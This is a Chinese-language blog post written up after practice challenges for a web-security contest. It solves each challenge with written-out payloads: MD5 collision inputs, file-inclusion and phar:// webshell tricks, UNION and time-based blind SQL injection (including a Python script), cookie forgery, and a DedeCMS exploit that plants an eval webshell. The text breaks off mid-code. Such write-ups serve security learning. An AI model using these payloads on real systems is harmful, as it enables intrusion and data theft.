<!DOCTYPE html>
<html lang="">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lethe">


    <meta name="subtitle" content="Life is a struggle">


    <meta name="description" content="Lethe's Blog">


    <meta name="keywords" content="Lethe's Blog">


<title>Web安全测试个人赛练习 | Lethe&#39;s Blog</title>



    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.1.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Web安全测试个人赛练习</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">October 25, 2019&nbsp;&nbsp;1:15:20</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Writeup/">Writeup</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p>报了一个Web安全测试个人赛，提供了赛前的练习，做一下就当准备了吧…</p>
<h1 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h1><p>查看源代码：<br><img src="/.site//20191021165329408.png" alt="在这里插入图片描述"></p>
<p>数组绕过即可，post：<code>data1[]=a&amp;data2[]=b</code></p>
<br>

<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p><img src="/.site//20191021171328452.png" alt="在这里插入图片描述"><br>同样是一道md5绕过，不过这里没法绕过，只能老老实实去找md5碰撞，google还是挺好找的</p>
<p>post:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;data2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<p><img src="/.site//20191021174409280.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h1><p>代码审计题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;A_A&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;A_A&#x27;</span>]:<span class="string">&#x27;A_A&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;A_A&quot;</span>) !==<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,have fun&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$str</span>&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too small&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ((<span class="keyword">string</span>)<span class="variable">$str</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too big&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>第一层：<br>既要通过<code>A_A</code>传参，又限制了查询字符串不能为<code>A_A</code>，这里用到了php的一个小特性..</p>
<p>可以参考这篇文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></p>
<p>借用文章里的一张图：<br><img src="/.site//20191021180048973.png" alt="在这里插入图片描述"></p>
<p>本题中的绕过方式有下面几种：<br><img src="/.site//20191021180213936.png" alt="在这里插入图片描述"></p>
<p>第二层：<br>传入的参数要大于9999999999，用数组绕过；string后要大于零，任意字符串即可。<br><img src="/.site//20191022204717628.png" alt="在这里插入图片描述"></p>
<p>综上，最后payload：<code>?A.A[]=a</code>，注释中看到flag</p>
<br>

<h1 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h1><h5 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h5><p>看到参数<code>url=upload</code>，尝试php伪协议文件包含，发现直接可以base64读出flag。</p>
<p><img src="/.site//20191022213437597.png" alt="在这里插入图片描述"><br>payload：<code>..index.php/url=php://filter/convert.base64-encode/resource=index</code></p>
<h5 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h5><p>毕竟给了上传页面，测试了一下，为白名单过滤，无法绕过…看到可以上传zip文件，可以利用<code>phar://</code>协议文件包含。</p>
<p>将一句话木马<code>shell.php</code>打包成压缩包，然后上传得到路径：<br><img src="/.site//20191022213725153.png" alt="在这里插入图片描述"><br>然后连接小马即可，连接url：<code>http://114.55.36.69:8009/index.php?url=phar://upload/695d93c8c583b14b83475449ed1f7b35.zip/shell</code></p>
<p><img src="/.site//2019102221384012.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="新闻搜索"><a href="#新闻搜索" class="headerlink" title="新闻搜索"></a>新闻搜索</h1><p>一个搜索页面，直接sqlmap就能跑出来</p>
<p><img src="/.site//20191022231802681.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h1><p>和上一题差不多，<code>word</code>参数存在搜索型注入，不过加了过滤，可以用内联绕过。</p>
<p>查表：<code>%&#39; /*!union*/ /*!select*/ 1,2,(/*!select*/ group_concat(table_name) from information_schema.tables where table_schema=database())#</code><br><img src="/.site//20191023213252683.png" alt="在这里插入图片描述"></p>
<p>查列：<code>%&#39; /*!union*/ /*!select*/ 1,2,(/*!select*/ group_concat(column_name) from information_schema.columns where table_name=&#39;admin&#39;)#</code></p>
<p><img src="/.site//20191023213257666.png" alt="在这里插入图片描述"></p>
<p>查数据：<code>%&#39; /*!union*/ /*!select*/ 1,2,(/*!select*/ group_concat(flag) from admin)#</code><br><img src="/.site//20191023213321255.png" alt="在这里插入图片描述"></p>
<h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>打开是一个贪吃蛇游戏，查看<code>game.js</code>，有一段奇奇怪怪的颜表情，复制到控制台输出一下：</p>
<p><img src="/.site//20191022235914697.png" alt="在这里插入图片描述"><br>输出了一个假的flag，看一下右下角的debugger，得到flag：</p>
<p><img src="/.site//20191022235945752.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h1><p>是一个dedecms sp2 v5.7，搜一下对应的漏洞即可，我参考的是这个：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/164035.html">https://www.freebuf.com/vuls/164035.html</a></p>
<p>先访问：<code>/dede/tpl.php?action=upload</code>，在源码中获得token，在下一步要用到。</p>
<p><img src="/.site//20191023001429610.png" alt="在这里插入图片描述"><br>再访问：<code>/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[cmd]);?%3E&amp;token=c5288eb4a985baa3520c2d006f45e346</code>，就会生成我们的shell文件。</p>
<p><img src="/.site//20191023001514426.png" alt="在这里插入图片描述"><br>最后连接我们的shell，访问：<code>/include/taglib/moonsec.lib.php</code>，先<code>find / -name flag</code>找一下flag得位置：</p>
<p><img src="/.site//20191023001625482.png" alt="在这里插入图片描述">读一下flag：</p>
<p><img src="/.site//20191023001641674.png" alt="在这里插入图片描述"></p>
<h1 id="新瓶装旧酒"><a href="#新瓶装旧酒" class="headerlink" title="新瓶装旧酒"></a>新瓶装旧酒</h1><p>这一题上来就给了源码，审计了半天…没看出来什么问题</p>
<p>后来知道是apache的版本问题，存在解析漏洞，即从右向左解析，遇到无法解析的就跳过继续像左解析。</p>
<p>所以我们将小马的后缀改为.<code>.PHP.jpg</code>，之所以把<code>PHP</code>大写来绕过代码中对<code>.ph</code>的过滤，然后将其压缩成<code>zip</code>压缩包上传</p>
<p><img src="/.site//2019102323573666.png" alt="在这里插入图片描述"><br>得到路径连接即可，在<code>flag.php</code>中发现flag。</p>
<p><img src="/.site//20191023235852776.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="sleepcms"><a href="#sleepcms" class="headerlink" title="sleepcms"></a>sleepcms</h1><p>访问<code>robots.txt</code>可以看到如下sql语句，应该是要注入出来：<br><img src="/.site//20191024194136975.png" alt="在这里插入图片描述"><br>根据题目名字，想到应该是时间盲注，但是过滤了常用的<code>sleep()</code>和<code>benchmark()</code>，经测试，还可以用<code>get_lock()</code>函数来进行延时。</p>
<p>但是发现<code>select</code>也被过滤了，尝试各种方式均无法绕过… 然后发现<code>article</code>页面回显的数据就是在<code>flag</code>那个表里查出来的，所以其实后台已经帮我们写好<code>select</code>语句了，直接拼接上<code>content</code>字段即可，用不到<code>select</code>。</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://114.55.36.69:8007/article.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">		payload = <span class="string">f&quot;?id=1&#x27; and if(ascii(substr((content),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,get_lock(&#x27;lethe&#x27;,3),1)%23&quot;</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			s.get(url + payload, timeout=<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">except</span> Exception:</span><br><span class="line">			flag += <span class="built_in">chr</span>(j)</span><br><span class="line">			<span class="built_in">print</span>(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>


<br>

<h1 id="秘密的系统"><a href="#秘密的系统" class="headerlink" title="秘密的系统"></a>秘密的系统</h1><p>访问<code>/web/robots.txt</code>得到提示<code>index.php?r=site/loginuser_1</code>，是一个登录界面，但是没有账号密码没有注册页面，查看源代码发现：</p>
<p><img src="/.site//20191024201210752.png" alt="在这里插入图片描述"></p>
<p>于是访问该github账号，得到如下提示：<br><img src="/.site//20191024201239823.png" alt="在这里插入图片描述"><br>给了我们一个账号密码<code>test/cil_sec</code>和cookie生成的规则，于是我们登录该账号，得到cookie如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cib=a%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A2%3Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bs%3A4%3A%22sign%22%3Bs%3A32%3A%227cbab5cea99169139e7e6d8ff74ebb77%22%3B%7D</span><br></pre></td></tr></table></figure>
<p>url解码再反序列化一下可以看到上面的其实就是：<br><img src="/.site//20191024203014196.png" alt="在这里插入图片描述"><br>于是我们利用如下脚本伪造cookie：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$sign</span> = [<span class="string">&quot;id&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;sign&quot;</span>=&gt;<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>.<span class="variable">$username</span>)];</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$sign</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sign</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/.site//20191024203104249.png" alt="在这里插入图片描述">将cookie更改为上述生成的，刷新页面，发现已经是管理员账户登录，然后我们来到上传界面：<br><img src="/.site//2019102420323151.png" alt="在这里插入图片描述"><br>测试发现为黑名单过滤，且Apache版本为2.2.15，可能存在解析漏洞，于是上传<code>shell.php.aaa</code>：<br><img src="/.site//20191024204019198.png" alt="在这里插入图片描述"><br>发现可以成功，连接shell得到flag。<br><img src="/.site//20191024204041382.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h1><p>题目在<code>    dama.xxxx</code>给了<code>dama.php</code>的源码，且看到<code>flag.php</code>在它们的上一层目录。</p>
<p>审计代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">echologin</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">chkpass</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">helloowner</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>], <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">echofail</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">gencodeurl</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$c</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">echofail</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$d</span> = @<span class="title function_ invoke__">json_decode</span>(<span class="variable">$c</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$d</span>[<span class="string">&#x27;f&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">echofail</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$d</span>[<span class="string">&#x27;f&#x27;</span>](<span class="variable">$d</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$e</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="variable">$g</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="string">&#x27;good&#x27;</span>;</span><br><span class="line">        <span class="variable">$g</span> = <span class="string">&#x27;web.com&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&#x27;http://&#x27;</span> . <span class="variable">$f</span> . <span class="variable">$g</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span>(<span class="params"><span class="variable">$h</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="string">&#x27;PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg==&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%id%&#x27;</span>, <span class="variable">$h</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$i</span>));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$j</span> = <span class="string">&#x27;PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$j</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>第一步要绕过的是<code>chkpass()</code>函数，这个比较简单，直接使<code>User-Agent</code>为<code>$a</code>（也就是传进去的pass参数值）的md5即可绕过。</p>
<p>接下来下面重点看的是这个函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">gencodeurl</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$c</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">echofail</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$d</span> = @<span class="title function_ invoke__">json_decode</span>(<span class="variable">$c</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$d</span>[<span class="string">&#x27;f&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">echofail</span>(<span 